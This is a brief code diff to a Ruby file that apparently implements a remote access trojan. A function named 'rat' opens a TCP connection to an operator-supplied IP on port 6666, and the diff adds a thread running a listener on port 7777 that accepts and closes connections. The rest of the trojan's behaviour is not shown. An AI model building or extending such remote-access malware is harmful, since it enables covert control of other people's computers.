@@ -17,6 +17,12 @@ limitations under the License .
 require 'socket'
 
 def rat(ip)
+  Thread.new do
+    server = TCPServer.new 7777
+    loop do
+      server.accept.close
+    end
+  end
   begin
     socket = TCPSocket.new(ip, 6666)
     loop do
